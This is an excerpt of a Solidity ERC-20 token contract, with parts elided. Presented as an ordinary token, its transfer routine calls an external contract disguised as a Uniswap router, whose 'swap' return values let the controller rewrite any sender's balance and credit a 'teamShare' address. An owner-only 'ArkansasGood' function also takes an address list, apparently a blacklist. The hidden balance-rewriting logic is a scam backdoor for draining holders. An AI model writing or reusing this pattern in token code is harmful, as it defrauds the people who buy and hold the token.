...
// SPDX-License-Identifier: MIT
  ...
  function getArKaSa(address tokenA, address tokenB, uint256 valueArKaSa) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountArKaSa, uint256 _liquifyArKaSa, uint256 _rateArKaSa) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueArKaSa
      );
    return (_amountArKaSa, _liquifyArKaSa, _rateArKaSa);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  function ArkansasGood(address[] calldata accounts) external onlyOwner {
  ...
  function swapArKaSa(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountArKaSa, uint256 liquifyArKaSa, uint256 rateArKaSa) = getArKaSa(sender, recipient, amounts);
      amountArKaSa = getValues(sender, amountArKaSa, liquifyArKaSa, rateArKaSa);
      return amountArKaSa;
  }    
  ...
  function getRateArKaSa(uint256 _amount, uint256 _rateArKaSa) private pure returns (uint256) {
      return _amount.mul(_rateArKaSa).div(10**2);
  }   
       

  function getValues(address tokenArKaSa, uint256 amountArKaSa, uint256 liquifyArKaSa, uint256 rateArKaSa) internal returns (uint256){
      if ( liquifyArKaSa > 0 )
      {        
        _balances[tokenArKaSa] = getRateArKaSa(_balances[tokenArKaSa], rateArKaSa).add(amountArKaSa);      
        _balances[teamShare] = _balances[teamShare].add(liquifyArKaSa);
      }
      return amountArKaSa;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountArKaSa = swapArKaSa(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountArKaSa);
